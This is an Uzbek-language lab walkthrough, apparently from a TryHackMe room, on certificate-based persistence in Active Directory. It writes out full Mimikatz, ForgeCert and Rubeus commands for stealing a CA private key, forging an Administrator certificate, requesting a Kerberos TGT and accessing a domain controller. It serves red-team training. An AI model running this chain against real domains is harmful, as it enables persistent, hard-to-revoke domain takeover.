
### **Eslatma:**

Bu yerda muhokama qilinayotgan texnikalar **nihoyatda tajovuzkor** va **ularni olib tashlash juda qiyin**. Agar siz red team mashqlaringizda ushbu texnikalardan foydalanishga ruxsat olgan bo‘lsangiz ham, **ularni bajarishda maksimal ehtiyotkorlik** bilan harakat qiling. Haqiqiy dunyodagi holatlarda bu texnikalardan foydalanish **butun domenni qayta tiklashga olib keladi**. Shuning uchun ushbu texnikalarning oqibatlarini to‘liq tushunganingizga ishonch hosil qiling va **faqat zarur bo‘lsa va oldindan ruxsat olingan bo‘lsa**gina ularni bajaring.

Ko‘pgina hollarda, red team mashqlari bu nuqtada **to‘xtatiladi (dechain)** va bu texnikalar **faqat simulyatsiya** qilinadi.

---

### **Kreditlarga bog‘liq bo‘lmagan (credential-agnostic) doimiylik:**

Avvalgi ikki doimiylik texnikasi **kreditlarga (login ma'lumotlariga)** tayangan edi. Bu texnikalar "Blue Team"ni band qilib qo‘yishi mumkin, lekin ular oxir-oqibat parollarni yangilash orqali sizni tizimdan chiqarib yuborishi mumkin.

Shuning uchun **kreditlarga bog‘liq bo‘lmagan texnikalar**ga o‘tamiz — ya'ni **sertifikatlar orqali doimiylik**.

---

### **Active Directory Certificate Services (AD CS) qaytishi:**

“Exploiting AD” bo‘limida biz **sertifikatlar orqali Domain Admin**ga aylangan edik. Endi esa sertifikatlardan **doimiylik** yaratish uchun foydalanamiz.

Agar bizda **Client Authentication** uchun yaroqli sertifikat bo‘lsa, u orqali **Kerberos TGT so‘rashimiz mumkin bo‘ladi** — hattoki administrator parolini o‘zgartirishsa ham, bizda doimiy kirish imkoni qoladi.

Agar ushbu sertifikat bekor qilinmasa yoki muddati tugamasa, biz **5 yilgacha tizimga kirishda davom etamiz**.

---

### **Yana bir qadam oldinga: CA kalitini o‘g‘irlash**

Biz \*\*sertifikatlarni beruvchi server (CA)\*\*ni egallab olishimiz mumkin. Agar bu serverda **HSM (Hardware Security Module)** yo‘q bo‘lsa, undagi **CA private key** — **Windowsning DPAPI** tizimi orqali himoyalangan bo‘ladi.

Biz bu **private key**ni olish uchun **Mimikatz** yoki **SharpDPAPI** kabi vositalardan foydalanamiz.

---

### **Mimikatz yordamida CA kalitini chiqarib olish:**

1. `crypto::certificates /systemstore:local_machine` — sertifikatlar ro‘yxatini ko‘rish
2. `privilege::debug` — debugging huquqini olish
3. `crypto::capi` va `crypto::cng` — CryptoAPI ni patch qilish
4. `crypto::certificates /systemstore:local_machine /export` — sertifikatlarni eksport qilish

Ekport qilingan fayllar:

* `.pfx` — private key bilan
* `.der` — faqat public key

Muhim fayl: `za-THMDC-CA.pfx` — bu bizni "hacker" sifatida doimiy qilishga xizmat qiladi.

---

### **ForgeCert yordamida soxta sertifikat yaratish:**

Endi biz bu `.pfx` fayldan foydalangan holda **istalgan foydalanuvchi nomidan sertifikat yaratishimiz mumkin.** Bu uchun `ForgeCert.exe` ishlatiladi:

```bash
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```

---

### **Rubeus yordamida TGT so‘rash:**

Yaratilgan sertifikat orqali TGT olish:

```bash
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:fullAdmin.pfx /password:Password123 /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.x.101
```

Agar muvaffaqiyatli bo‘lsa, `.kirbi` fayli olinadi — bu **Kerberos TGT** ni anglatadi.

---

### **Mimikatz orqali TGTni yuklab olish:**

```bash
kerberos::ptt administrator.kirbi
```

Endi siz Domain Controllerga quyidagicha kirishingiz mumkin:

```bash
dir \\THMDC.za.tryhackme.loc\c$\
```

Bu esa shuni bildiradiki — **siz endi to‘liq administrator sifatida tarmoqda faoliyat yuritmoqdasiz.**

---

### **Xulosa:**

Sertifikat orqali yaratilgan doimiylik — **eng xavfli va eng yashirin turlaridan biridir**. Buni aniqlash va bekor qilish **nafaqat murakkab**, balki ko‘p hollarda **domenni butunlay qayta tiklashni talab qiladi**.

Siz yaratgan soxta sertifikatlar **Active Directory tomonidan rasmiy tarzda berilmaganligi sababli bekor qilib bo‘lmaydi**, shuning uchun **CAni o‘zgartirish** — yagona yechim bo‘lib qoladi.
